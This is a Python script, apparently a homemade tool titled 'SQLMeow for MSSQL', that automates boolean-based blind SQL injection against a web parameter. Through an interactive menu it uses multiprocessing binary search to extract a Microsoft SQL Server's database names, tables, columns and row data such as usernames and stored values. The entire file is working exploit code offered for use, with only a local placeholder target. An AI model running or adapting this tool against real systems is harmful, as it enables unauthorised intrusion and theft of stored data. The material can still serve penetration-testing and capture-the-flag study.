import requests
from multiprocessing import Pool
from itertools import repeat

def boolean_based_blind(condition):
    url = 'http://127.0.0.1:8790/?query=' # change me
    query = f"SELECT @@version WHERE {condition}" # change me
    response = requests.get(url+query) # maybe change me
    if 'KB5008996' in response.text: # change me to other keyword or length
        return True
    else:
        return False

def test():
    meow = boolean_based_blind("1=1")
    print("Intend True: ", meow)
    meowmeow = boolean_based_blind("1=0")
    print("Intend False: ", meowmeow)
    if meow and not meowmeow:
        print("✅ Test success 🐱🐱🐱🐱🐱🐱🐱🐱🐱")
    else:
        print("❌ Test fail 😿😿😿😿😿😿😿😿😿😿")
    # print(boolean_based_blind("1=1")) # Return True
    # print(boolean_based_blind("1=0")) # Return False


def do_binary_search(right_condition,guess_range,v=0):
    left = guess_range[0]
    right = guess_range[1]
    while right - left > 3: # <= 3 will stop
        if v == 1:
            print("\t\t\t\t\t\t",end='\r')
            print(left,'~',right,end='\r')
        guess = int(left+(right-left)/2)
        if boolean_based_blind(f"({guess}>{right_condition})"):
            right = guess
        else:
            left = guess
    for i in range(left,right): # do match
        if v == 1:
            print("\t\t\t\t\t\t",end='\r')
            print("Testing",i,end='\r')
        if boolean_based_blind(f"({i}={right_condition})"):
            if v == 1:
                print("\t\t\t\t\t\t",end='\r')
                print("Answer :",i , f"({chr(i) if i >= 32 and i <= 127 else ''})")
            return i





###################
################### Current DB
def get_current_db(v):
    print("[🐱] Query DB Strings Length")
    current_len_right = "(SELECT LEN(db_name()))" 
    guess_range = [1,100]
    current_db_len = do_binary_search(current_len_right,guess_range,v)
    print("[😺😺]Current DB Length:", current_db_len)

    db_name_right_condition = "(SELECT ASCII(SUBSTRING(db_name(),{current_db_len},1)))"
    db_name_right_conditions = [db_name_right_condition.format(current_db_len=i) for i in range(1,current_db_len+1)]
    guess_range = [32,128]
    param = zip(db_name_right_conditions,repeat(guess_range),repeat(v))
    db_name = pool.starmap(do_binary_search, param)
    db_name = ''.join([chr(i) for i in db_name])
    print("[😺😺]Current DB Name:", db_name)




###################
################### Database
def get_dbs(v):
    print("[🐱] Query DB Size")
    db_size_right = "(SELECT COUNT(name) FROM master.dbo.sysdatabases)"
    guess_range = [1,20]
    db_size = do_binary_search(db_size_right,guess_range,v)
    print("[😺😺]DB Size:" , db_size)

    print("[🐱] Query DB Strings Length")
    db_str_len_right = "(SELECT LEN(name) FROM master.dbo.sysdatabases WHERE dbid={db_num})"
    db_str_len_rights = [db_str_len_right.format(db_num=i+1) for i in range(db_size)]
    guess_range = [1,100]
    param = zip(db_str_len_rights,repeat(guess_range),repeat(v))
    db_str_lens = pool.starmap(do_binary_search, param)
    print("[😺😺]DB Strings Length:", db_str_lens)

    print("[🐱] Query DB Name")
    db_names = []
    for size in range(db_size):
        db_name_right_condition = "(SELECT ASCII(SUBSTRING(name,{db_name_index},1)) FROM master.dbo.sysdatabases WHERE dbid={size})"
        db_name_right_conditions = [db_name_right_condition.format(db_name_index=i,size=size+1) for i in range(1,db_str_lens[size]+1)]
        guess_range = [32,128]
        param = zip(db_name_right_conditions,repeat(guess_range),repeat(v))
        db_name = pool.starmap(do_binary_search, param)
        db_name = ''.join([chr(i) for i in db_name])
        print(f"DB_Name[{size}]={db_name}")
        db_names.append(db_name)
    print("[😺😺]DB_Name:", db_names)


###################
################### Table
def get_tables(v):
    db = input("Database Name : ")
    print("[🐱] Query Tables Size")
    table_size_right = f"(SELECT COUNT(name) FROM {db}..sysobjects WHERE xtype='U')"
    guess_range = [1,200]
    table_size = do_binary_search(table_size_right,guess_range,v)
    print("Tables Size:" , table_size)

    print("[🐱] Query Table Strings Length and Table Names")
    table_names = []
    for size in range(table_size):
        if size == 0:
            table_str_len_right = f"(SELECT TOP 1 LEN(name) FROM {db}..sysobjects WHERE xtype='U')"
        else:
            known_tables = ','.join([f"'{t}'" for t in table_names])
            table_str_len_right = f"(SELECT TOP 1 LEN(name) FROM {db}..sysobjects WHERE xtype='U' AND name NOT IN ({known_tables}))"
        guess_range = [1,100]
        table_str_len = do_binary_search(table_str_len_right,guess_range,v)
        if size == 0:
            table_name_right_condition = "(SELECT TOP 1 ASCII(SUBSTRING(name,{table_name_index},1)) FROM {db}..sysobjects WHERE xtype='U')"
            table_name_right_conditions = [table_name_right_condition.format(table_name_index=j,db=db) for j in range(1,table_str_len+1)]
        else:
            table_name_right_condition = "(SELECT TOP 1 ASCII(SUBSTRING(name,{table_name_index},1)) FROM {db}..sysobjects WHERE xtype='U' AND name NOT IN ({known_tables}))"
            table_name_right_conditions = [table_name_right_condition.format(table_name_index=j,db=db,known_tables=known_tables) for j in range(1,table_str_len+1)]
        guess_range = [32,128]
        param = zip(table_name_right_conditions,repeat(guess_range),repeat(v)) 
        table_name = pool.starmap(do_binary_search, param)
        table_name = ''.join([chr(i) for i in table_name])
        print(f"Table_Name[{size}]={table_name}")
        table_names.append(table_name)
    print("[😺😺]Table_Name:", table_names)



################### 
################### Column
def get_columns(v):
    db = input("Database Name : ")
    table = input("Table Name : ")
    print("[🐱] Query Column Size")
    column_size_right = f"(SELECT COUNT(column_name) FROM information_schema.columns WHERE table_catalog='{db}' AND table_name='{table}')"
    guess_range = [1,200]
    column_size = do_binary_search(column_size_right,guess_range,v)
    print("Column Size:" , column_size)

    print("[🐱] Query Column Strings Length and Column Names")
    column_names = []
    for size in range(column_size):
        if size == 0:
            column_str_len_right = f"(SELECT TOP 1 LEN(column_name) FROM information_schema.columns WHERE table_catalog='{db}' AND table_name='{table}')"
        else:
            known_columns = ','.join([f"'{t}'" for t in column_names])
            column_str_len_right = f"(SELECT TOP 1 LEN(column_name) FROM information_schema.columns WHERE table_catalog='{db}' AND table_name='{table}' AND column_name NOT IN ({known_columns}))"
        guess_range = [1,100]
        table_str_len = do_binary_search(column_str_len_right,guess_range,v)
        if size == 0:
            column_name_right_condition = "(SELECT TOP 1 ASCII(SUBSTRING(column_name,{column_name_index},1)) FROM information_schema.columns WHERE table_catalog='{db}' AND table_name='{table}')"
            column_name_right_conditions = [column_name_right_condition.format(column_name_index=j,db=db,table=table) for j in range(1,table_str_len+1)]
        else:
            column_name_right_condition = "(SELECT TOP 1 ASCII(SUBSTRING(column_name,{column_name_index},1)) FROM information_schema.columns WHERE table_catalog='{db}' AND table_name='{table}' AND column_name NOT IN ({known_columns}))"
            column_name_right_conditions = [column_name_right_condition.format(column_name_index=j,db=db,table=table,known_columns=known_columns) for j in range(1,table_str_len+1)]
        guess_range = [32,128]
        param = zip(column_name_right_conditions,repeat(guess_range),repeat(v)) 
        column_name = pool.starmap(do_binary_search, param)
        column_name = ''.join([chr(i) for i in column_name])
        print(f"Column_Name[{size}]={column_name}")
        column_names.append(column_name)
    print("[😺😺]Column_Name:", column_names)


######
###### SELECT DATA
def get_data(v):
    db = input("Database Name : ")
    table = input("Table Name : ")
    column = input("Column Name (support 'concat'): ")
    unique_column = input("Unique Column (String type) (e.g. username): ")

    print("[🐱] Query Data Size")
    data_size_right = f"(SELECT COUNT({unique_column}) FROM {db}..{table})"
    guess_range = [1,100]
    data_size = do_binary_search(data_size_right,guess_range,v)
    print("[😺😺]Data Size:" , data_size)

    print("[🐱] Query Unique Data Strings Length and Names")
    unique_names = []
    for size in range(data_size):
        if size == 0:
            unique_str_len_right = f"(SELECT TOP 1 LEN({unique_column}) FROM {db}..{table})"
        else:
            known_unique = ','.join([f"'{t}'" for t in unique_names])
            unique_str_len_right = f"(SELECT TOP 1 LEN({unique_column}) FROM {db}..{table} WHERE {unique_column} NOT IN ({known_unique}))"
        guess_range = [1,100]
        unique_str_len = do_binary_search(unique_str_len_right,guess_range,v)
        if size == 0:
            unique_name_right_condition = "(SELECT TOP 1 ASCII(SUBSTRING({unique_column},{unique_name_index},1)) FROM {db}..{table})"
            unique_name_right_conditions = [unique_name_right_condition.format(unique_column=unique_column,unique_name_index=j,db=db,table=table) for j in range(1,unique_str_len+1)]
        else:
            unique_name_right_condition = "(SELECT TOP 1 ASCII(SUBSTRING({unique_column},{unique_name_index},1)) FROM {db}..{table} WHERE {unique_column} NOT IN ({known_unique}))"
            unique_name_right_conditions = [unique_name_right_condition.format(unique_column=unique_column,unique_name_index=j,db=db,table=table,known_unique=known_unique) for j in range(1,unique_str_len+1)]
        guess_range = [32,128]
        param = zip(unique_name_right_conditions,repeat(guess_range),repeat(v)) 
        unique_name = pool.starmap(do_binary_search, param)
        unique_name = ''.join([chr(i) for i in unique_name])
        print(f"Unique_Name[{size}]={unique_name}")
        unique_names.append(unique_name)

    print("[😺😺]Unique_Name:", unique_names)
    data_names = []
    for u in unique_names:
        print("[🐱] Query Data Strings Length and Names")
        data_str_len_right = f"(SELECT LEN({column}) FROM {db}..{table} WHERE {unique_column}='{u}')"

        guess_range = [1,100]
        data_str_len = do_binary_search(data_str_len_right,guess_range,v)

        data_name_right_condition = "(SELECT ASCII(SUBSTRING({column},{data_name_index},1)) FROM {db}..{table} WHERE {unique_column}='{u}')"
        data_name_right_conditions = [data_name_right_condition.format(column=column,data_name_index=j,db=db,table=table,unique_column=unique_column,u=u) for j in range(1,data_str_len+1)]

        guess_range = [32,128]
        param = zip(data_name_right_conditions,repeat(guess_range),repeat(v)) 
        data_name = pool.starmap(do_binary_search, param)
        data_name = ''.join([chr(i) for i in data_name])
        print(f"Data_Name[{unique_names.index(u)}]={data_name}")
        data_names.append(data_name)
    print("[😺😺]Data_Name:", data_names)


banner = """
▒█▀▀▀█ ▒█▀▀█ ▒█░░░ ▒█▀▄▀█ ▒█▀▀▀ █▀▀█ █░░░█
░▀▀▀▄▄ ▒█░▒█ ▒█░░░ ▒█▒█▒█ ▒█▀▀▀ █▄▀█ █▄█▄█
▒█▄▄▄█ ░▀▀█▄ ▒█▄▄█ ▒█░░▒█ ▒█▄▄▄ █▄▄█ ░▀░▀░ for MSSQL
"""
print(banner)

verbose = 1
func = int(input(""" 
 🐱 (0) System Test
 🐱 (1) Get Current DB
 🐱 (2) Get All DBS
 🐱 (3) Get Tables
 🐱 (4) Get Columns
 🐱 (5) Get Data
Your Option : """))
threads = int(input("Threads (Suggest 10): "))
pool = Pool(threads)

if func == 0:
    test()
elif func == 1:
    get_current_db(verbose)
elif func == 2:
    get_dbs(verbose)
elif func == 3:
    get_tables(verbose)
elif func == 4:
    get_columns(verbose)
elif func == 5:
    get_data(verbose)
